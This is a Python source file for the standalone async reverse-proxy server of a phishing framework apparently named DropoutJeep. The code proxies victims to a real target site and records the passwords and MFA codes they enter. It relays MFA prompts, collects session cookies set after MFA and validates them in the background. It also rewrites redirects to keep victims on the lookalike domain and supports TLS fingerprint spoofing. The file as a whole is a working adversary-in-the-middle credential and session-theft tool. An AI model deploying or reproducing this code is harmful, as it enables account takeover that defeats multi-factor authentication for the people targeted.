"""Standalone async proxy server for DropoutJeep.

This ASGI application provides clean-URL reverse proxying (GAP 2) and WebSocket
forwarding (GAP 10) without the WSGI blocking limits of the Flask process. It
reads campaign configuration from the same database and can run on a separate
port (default 8080).

Usage::

    python -m dropoutjeep_lib.proxy.server

Or with uvicorn directly::

    uvicorn dropoutjeep_lib.proxy.server:app --host 0.0.0.0 --port 8080
"""

import asyncio
import json
import logging
import os
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse

import httpx
from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.requests import Request as StarletteRequest
from starlette.responses import Response as StarletteResponse, PlainTextResponse
from starlette.routing import Route, WebSocketRoute
from starlette.websockets import WebSocket

try:
    from starlette.middleware.proxy_headers import ProxyHeadersMiddleware
except ModuleNotFoundError:  # pragma: no cover - starlette 1.x removed this module
    class ProxyHeadersMiddleware:
        """Minimal fallback for starlette 0.x ProxyHeadersMiddleware."""

        def __init__(self, app, trusted_hosts=None):
            self.app = app
            self.trusted_hosts = trusted_hosts or "*"

        async def __call__(self, scope, receive, send):
            if scope["type"] in ("http", "websocket"):
                headers = dict(scope.get("headers", []))
                # Keys are lower-cased bytes in ASGI.
                x_forwarded_for = headers.get(b"x-forwarded-for")
                x_forwarded_proto = headers.get(b"x-forwarded-proto")

                if x_forwarded_for:
                    # Take the first hop as the client IP.
                    host = x_forwarded_for.split(b",")[0].strip().decode("latin-1")
                    port = scope.get("client", [None, 0])[1] or 0
                    scope["client"] = (host, port)

                if x_forwarded_proto:
                    proto = x_forwarded_proto.decode("latin-1").strip()
                    if proto in ("http", "https"):
                        scope["scheme"] = proto

            await self.app(scope, receive, send)

from .engine import proxy_request, Rule
from .plugin_system import load_python_plugins, HTTPExchange, fire_plugin_exchange_hooks
from .cookies import parse_request_cookie_header, parse_set_cookie_headers
from .credentials import parse_post_body, extract_credentials, find_username
from .mfa_relay import prepare_relay_body
from .tls_transport import build_async_client
from ..utils.cookie_validation import schedule_validate_recipient_session

logger = logging.getLogger(__name__)

# Thread pool for synchronous DB operations in the async server.
_db_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="proxy-db-")

# Shared async HTTP client keyed by upstream proxy URL + TLS fingerprint.
_proxy_workers: dict[tuple[str | None, str | None], "ProxyWorker"] = {}
_worker_lock = asyncio.Lock()


def _get_database_url() -> str:
    url = os.environ.get("DATABASE_URL", "sqlite:///phish.db")
    # Allow concurrent reads from the same SQLite file in a separate process.
    if url.startswith("sqlite:///") and "?" not in url and "mode=ro" not in url:
        url = url + "?check_same_thread=false"
    return url


# This process writes events into the same SQLite file as the Flask app.
# WAL plus a busy timeout is what stops "database is locked" from silently
# dropping a recorded click.
from dropoutjeep_lib.utils.db_pragmas import install_sqlite_pragmas  # noqa: E402
install_sqlite_pragmas()


def _get_sqlalchemy_session():
    # When running inside the Flask app (e.g. tests), reuse the bound session
    # so in-memory SQLite databases are shared. In the standalone process there
    # is no app context, so we build a fresh engine per session.
    try:
        from flask import has_app_context
        if has_app_context():
            from dropoutjeep_lib import db
            return db.session
    except Exception:
        pass

    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    engine = create_engine(_get_database_url())
    Session = sessionmaker(bind=engine)
    return Session()


def _lookup_campaign_by_domain(domain: str):
    from dropoutjeep_lib.models import ProxyDomain, Campaign
    session = _get_sqlalchemy_session()
    try:
        # Exact match first.
        pd = session.query(ProxyDomain).filter_by(domain=domain, is_active=True).first()
        if not pd:
            # Wildcard match: token.base.example.com against *.base.example.com.
            parts = domain.split('.')
            for i in range(1, len(parts)):
                base = '.'.join(parts[i:])
                pd = session.query(ProxyDomain).filter_by(
                    base_domain=base, is_wildcard=True, is_active=True
                ).first()
                if pd:
                    break
        if not pd:
            return None, None
        campaign = session.query(Campaign).get(pd.campaign_id)
        if not campaign or campaign.flow_type != "reverse_proxy":
            return None, None
        # Detach from session so we can use them after closing.
        session.expunge(campaign)
        session.expunge(pd)
        return campaign, pd
    finally:
        session.close()


def _find_recipient(campaign_id: int, token: str):
    from dropoutjeep_lib.models import Recipient
    session = _get_sqlalchemy_session()
    try:
        r = session.query(Recipient).filter_by(campaign_id=campaign_id, token=token).first()
        if r:
            session.expunge(r)
        return r
    finally:
        session.close()


def _persist_capture(campaign, method: str, body: bytes, content_type: str, path: str,
                     headers: dict, resp_headers: dict, target_url: str,
                     recipient_token: str | None, did_mfa_relay: bool = False):
    """Synchronously persist credentials and cookies from a proxied exchange."""
    from dropoutjeep_lib import db
    from dropoutjeep_lib.models import (
        Campaign, Recipient, Event, CapturedCookie, CapturedCredential
    )

    session = _get_sqlalchemy_session()
    try:
        # Re-attach campaign/recipient to this session.
        campaign = session.query(Campaign).get(campaign.id)
        recipient = None
        if recipient_token:
            recipient = session.query(Recipient).filter_by(
                campaign_id=campaign.id, token=recipient_token
            ).first()

        config = campaign.get_flow_config()

        # Credential capture.
        if config.get("capture_credentials") and method.upper() == "POST":
            password_fields = config.get("password_field_names") or None
            mfa_fields = config.get("mfa_field_names") or None
            fields = parse_post_body(body, content_type)
            username = find_username(fields)
            username_for_event = username or (recipient.email if recipient else None)
            for item in extract_credentials(fields, password_fields, mfa_fields):
                cred = CapturedCredential(
                    campaign_id=campaign.id,
                    recipient_id=recipient.id if recipient else None,
                    credential_type=item["type"],
                    field_name=item["field"],
                    username=username_for_event,
                    source_path=path,
                )
                cred.set_value(item["value"])
                session.add(cred)
                event_type = "proxy_mfa_capture" if item["type"] == "mfa" else "proxy_credential_capture"
                session.add(Event(
                    campaign_id=campaign.id,
                    recipient_id=recipient.id if recipient else None,
                    event_type=event_type,
                    meta=json.dumps({
                        "field": item["field"],
                        "username": username_for_event,
                        "credential_type": item["type"],
                        "path": path,
                    }, default=str),
                ))

        # Cookie capture.
        captured_cookie_names = []
        if config.get("capture_cookies"):
            cookie_source = "post_mfa" if did_mfa_relay else "response"
            cookie_header = headers.get('Cookie') or headers.get('cookie')
            for c in parse_request_cookie_header(cookie_header):
                session.add(CapturedCookie(
                    campaign_id=campaign.id,
                    recipient_token=recipient_token,
                    cookie_name=c['name'],
                    cookie_value=c['value'],
                    source='request',
                ))
            for c in parse_set_cookie_headers(resp_headers, target_url):
                session.add(CapturedCookie(
                    campaign_id=campaign.id,
                    recipient_token=recipient_token,
                    cookie_name=c['name'],
                    cookie_value=c['value'],
                    cookie_domain=c['domain'],
                    cookie_path=c['path'],
                    source=cookie_source,
                ))
                captured_cookie_names.append(c['name'])

            if did_mfa_relay and captured_cookie_names:
                session.add(Event(
                    campaign_id=campaign.id,
                    recipient_id=recipient.id if recipient else None,
                    event_type="proxy_session_cookie_capture",
                    meta=json.dumps({
                        "recipient_token": recipient_token,
                        "path": path,
                        "cookie_names": captured_cookie_names,
                    }, default=str),
                ))

        session.commit()

        # Validate any post-MFA session cookies in the background.
        if did_mfa_relay and captured_cookie_names:
            schedule_validate_recipient_session(campaign.id, recipient_token)
    except Exception:
        session.rollback()
        logger.exception("Standalone proxy capture persistence failed")
    finally:
        session.close()


class ProxyWorker:
    """Thin wrapper around an async HTTP transport adapter."""

    def __init__(self, proxy_url: str | None = None, tls_fingerprint: str | None = None):
        self.proxy_url = proxy_url
        self.tls_fingerprint = tls_fingerprint or None
        self.client = build_async_client(
            tls_fingerprint=tls_fingerprint,
            proxy_url=proxy_url,
            verify=False,
            timeout=30,
        )


async def _get_worker(proxy_url: str | None, tls_fingerprint: str | None = None) -> ProxyWorker:
    key = (proxy_url, tls_fingerprint or None)
    async with _worker_lock:
        worker = _proxy_workers.get(key)
        if worker is None:
            worker = ProxyWorker(proxy_url, tls_fingerprint)
            _proxy_workers[key] = worker
        return worker


async def proxy_http_endpoint(request: StarletteRequest):
    """HTTP request handler for the standalone async proxy."""
    host = request.headers.get("host", "").split(":")[0]
    campaign, proxy_domain = await asyncio.get_event_loop().run_in_executor(
        _db_executor, _lookup_campaign_by_domain, host
    )
    if not campaign:
        return PlainTextResponse("No proxy campaign configured for this domain", status_code=404)

    config = campaign.get_flow_config()
    target_url = config.get("target_url", "")
    if not target_url:
        return PlainTextResponse("No target_url configured", status_code=500)

    # Recipient token may be passed as a query parameter or as the subdomain
    # of a wildcard ProxyDomain, e.g. token.base.example.com.
    recipient_token = request.query_params.get("dj_token")
    if not recipient_token and proxy_domain and proxy_domain.is_wildcard:
        subdomain = host.split('.')[0]
        if subdomain and subdomain != proxy_domain.base_domain:
            recipient_token = subdomain
    recipient = None
    if recipient_token:
        recipient = await asyncio.get_event_loop().run_in_executor(
            _db_executor, _find_recipient, campaign.id, recipient_token
        )

    path = request.url.path or "/"
    method = request.method
    headers = dict(request.headers)
    query_params = {k: v for k, v in request.query_params.items() if k != "dj_token"}
    body = await request.body()
    content_type = request.headers.get("content-type")

    client_ip = request.client.host if request.client else None
    forward_body, forward_content_type, did_mfa_relay = prepare_relay_body(
        campaign.id, recipient_token, client_ip, method, path, body, content_type, config
    )
    if forward_content_type:
        headers["Content-Type"] = forward_content_type
    if did_mfa_relay or forward_body != body:
        headers["Content-Length"] = str(len(forward_body))

    # Build rules and context.
    from .plugin_loader import load_plugins as load_yaml_plugins
    plugin_names = config.get("plugins", [])
    rules = load_yaml_plugins(plugin_names)
    for r in config.get("rules", []):
        try:
            rules.append(Rule(r))
        except Exception as exc:
            logger.warning("Skipping invalid inline rule: %s", exc)

    python_plugins = load_python_plugins()
    ctx = {
        "static_prefix": config.get("static_prefix", "/static/"),
        "token": recipient_token or "",
        "campaign_id": campaign.id,
        "max_buffer_size": config.get("max_buffer_size", 10 * 1024 * 1024),
    }

    worker = await _get_worker(
        config.get("upstream_proxy") or None,
        config.get("tls_fingerprint"),
    )
    resp = await proxy_request(
        worker.client, method, target_url, path, headers, query_params, forward_body,
        rules, ctx, plugins=python_plugins,
    )

    # Persist captured data in background.
    asyncio.get_event_loop().run_in_executor(
        _db_executor, _persist_capture,
        campaign, method, body, content_type, path, headers, resp.headers,
        target_url, recipient_token, did_mfa_relay,
    )

    # Rewrite target redirects so the victim stays on the clean proxy domain.
    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get("Location")
        if location:
            parsed_loc = urlparse(location)
            if parsed_loc.scheme or parsed_loc.netloc:
                # Absolute URL: rewrite to same host, keep path/query/fragment.
                new_url = f"{request.url.scheme}://{host}{parsed_loc.path or '/'}"
                if parsed_loc.query:
                    new_url += "?" + parsed_loc.query
                if parsed_loc.fragment:
                    new_url += "#" + parsed_loc.fragment
                resp.headers["Location"] = new_url
            # Relative URLs are left unchanged; the browser resolves against the clean domain.

    # Build Starlette response.
    if resp.passthrough:
        response_body = resp.raw_body or b""
    else:
        response_body = (resp.body or "").encode("utf-8", errors="replace")

    response_headers = {
        k: v for k, v in resp.headers.items()
        if k.lower() not in ("transfer-encoding", "content-encoding", "connection", "keep-alive")
    }

    # Fire plugin exchange hooks.
    exchange = HTTPExchange(
        method=method, path=path, target_url=target_url,
        campaign_id=campaign.id, recipient_token=recipient_token,
        request_headers=headers, request_body=body or b"",
        response_status=resp.status_code, response_headers=dict(resp.headers),
        response_body=resp.body or "",
    )
    fire_plugin_exchange_hooks(exchange, python_plugins)

    return StarletteResponse(content=response_body, status_code=resp.status_code,
                             headers=response_headers)


async def proxy_websocket_endpoint(websocket: WebSocket):
    """WebSocket handler: relay between victim and target WebSocket."""
    await websocket.accept()
    host = websocket.headers.get("host", "").split(":")[0]
    campaign, _proxy_domain = await asyncio.get_event_loop().run_in_executor(
        _db_executor, _lookup_campaign_by_domain, host
    )
    if not campaign:
        await websocket.close(code=1000)
        return

    config = campaign.get_flow_config()
    target_url = config.get("target_url", "")
    if not target_url or not config.get("ws_proxy"):
        await websocket.close(code=1000)
        return

    parsed = urlparse(target_url)
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    target_ws_url = f"{ws_scheme}://{parsed.netloc}{websocket.url.path}"
    if websocket.url.query:
        target_ws_url += "?" + str(websocket.url.query)

    try:
        import websockets
    except ImportError:
        logger.error("websockets library is required for WebSocket proxy")
        await websocket.close(code=1011)
        return

    target_headers = {
        k.decode(): v.decode()
        for k, v in websocket.headers.raw
        if k.lower() not in (b"host", b"connection", b"upgrade", b"sec-websocket-key",
                             b"sec-websocket-version", b"sec-websocket-extensions",
                             b"sec-websocket-protocol")
    }

    try:
        async with websockets.connect(target_ws_url, extra_headers=target_headers) as target_ws:
            async def client_to_target():
                while True:
                    try:
                        msg = await websocket.receive_text()
                        await target_ws.send(msg)
                    except Exception:
                        break

            async def target_to_client():
                async for msg in target_ws:
                    try:
                        await websocket.send_text(msg)
                    except Exception:
                        break

            await asyncio.gather(client_to_target(), target_to_client())
    except Exception as exc:
        logger.exception("WebSocket proxy error: %s", exc)
    finally:
        try:
            await websocket.close()
        except Exception:
            pass


routes = [
    Route("/{path:path}", proxy_http_endpoint, methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]),
    WebSocketRoute("/{path:path}", proxy_websocket_endpoint),
]

middleware = [
    Middleware(ProxyHeadersMiddleware, trusted_hosts="*"),
]

app = Starlette(routes=routes, middleware=middleware)


if __name__ == "__main__":
    import uvicorn
    logging.basicConfig(level=logging.INFO)
    uvicorn.run(app, host=os.environ.get("PROXY_HOST", "0.0.0.0"),
                port=int(os.environ.get("PROXY_PORT", "8080")))
